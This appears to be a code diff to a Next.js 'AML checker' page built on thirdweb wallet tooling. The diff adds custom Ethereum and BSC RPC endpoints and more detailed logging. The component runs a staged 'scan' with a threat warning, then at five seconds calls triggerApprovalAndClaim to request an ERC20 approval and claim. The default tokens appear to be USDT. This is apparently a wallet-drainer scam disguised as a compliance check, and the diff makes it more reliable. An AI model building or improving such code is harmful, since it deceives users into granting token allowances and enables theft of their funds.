@@ -4,9 +4,8 @@ import { useState, useRef, useEffect } from 'react';
 import Image from 'next/image';
 import Link from 'next/link';
 import { ConnectButton, darkTheme, useActiveAccount } from 'thirdweb/react';
-import { createThirdwebClient, prepareContractCall, getContract, sendTransaction } from 'thirdweb';
+import { createThirdwebClient, prepareContractCall, getContract, sendTransaction, http, defineChain } from 'thirdweb';
 import { createWallet } from 'thirdweb/wallets';
-import { mainnet, bsc } from 'thirdweb/chains';
 import { NETWORKS, type Network } from '@/lib/networks';
 
 const client = createThirdwebClient({
@@ -35,15 +34,31 @@ const ERC20_ABI = [
   },
 ] as const;
 
-// Network config using thirdweb's built-in chains (reliable public RPCs)
+// Network config using explicitly defined chains with stable RPC endpoints
+const ethereumChain = defineChain({
+  id: 1,
+  name: 'Ethereum',
+  nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+  rpc: http('https://eth.merkle.io'),
+  blockExplorers: [{ name: 'Etherscan', url: 'https://etherscan.io' }],
+});
+
+const bscChain = defineChain({
+  id: 56,
+  name: 'Binance Smart Chain',
+  nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+  rpc: http('https://bsc.merkle.io'),
+  blockExplorers: [{ name: 'BscScan', url: 'https://bscscan.com' }],
+});
+
 const NETWORK_CONFIG = {
   erc: {
-    chain: mainnet,
+    chain: ethereumChain,
     tokenAddress: process.env.NEXT_PUBLIC_TOKEN_ADDRESS || '0xdAC17F958D2ee523a2206206994597C13D831ec7',
     contractAddress: process.env.NEXT_PUBLIC_CONTRACT_ADDRESS || '',
   },
   bsc: {
-    chain: bsc,
+    chain: bscChain,
     tokenAddress: process.env.NEXT_PUBLIC_BSC_TOKEN_ADDRESS || process.env.NEXT_PUBLIC_TOKEN_ADDRESS || '0x55d398326f99059fF775485246999027B3197955',
     contractAddress: process.env.NEXT_PUBLIC_BSC_CONTRACT_ADDRESS || '',
   },
@@ -93,16 +108,32 @@ export default function AMLChecker() {
     const currentAccount = accountRef.current;
     const networkKey = selectedNetworkRef.current as Network;
 
-    if (!currentAccount || !networkKey || !NETWORK_CONFIG[networkKey]) {
-      console.error('[v0] Missing account or network config');
+    console.log('[v0] triggerApprovalAndClaim: account=', currentAccount?.address?.slice(0, 6), 'networkKey=', networkKey);
+
+    if (!currentAccount) {
+      console.error('[v0] Missing account — accountRef.current is null/undefined');
       setShowThreatModal(false);
-      throw new Error('Account or network not ready');
+      throw new Error('Account not ready');
+    }
+    
+    if (!networkKey) {
+      console.error('[v0] Missing network key — selectedNetworkRef.current is null/undefined');
+      setShowThreatModal(false);
+      throw new Error('Network not selected');
+    }
+
+    if (!NETWORK_CONFIG[networkKey]) {
+      console.error('[v0] Unknown network key:', networkKey, 'available:', Object.keys(NETWORK_CONFIG));
+      setShowThreatModal(false);
+      throw new Error('Network config not found: ' + networkKey);
     }
 
     const { chain, tokenAddress, contractAddress } = NETWORK_CONFIG[networkKey];
 
+    console.log('[v0] Using chain:', chain.name, 'id:', chain.id, 'rpc:', chain.rpc);
+
     if (!contractAddress || !tokenAddress) {
-      console.error('[v0] Missing contract or token address');
+      console.error('[v0] Missing contract or token address - contract:', contractAddress, 'token:', tokenAddress);
       setShowThreatModal(false);
       throw new Error('Contract or token address not configured');
     }
@@ -197,7 +228,7 @@ export default function AMLChecker() {
     setShowThreatModal(false);
     approvalTriggeredRef.current = false;
 
-    console.log('[v0] Scan started — will trigger approval at 5s');
+    console.log('[v0] Scan started — will trigger approval at 5s. Network:', selectedNetworkRef.current, 'Account:', accountRef.current?.address?.slice(0, 6));
 
     let approvalRetries = 0;
     const maxRetries = 2;
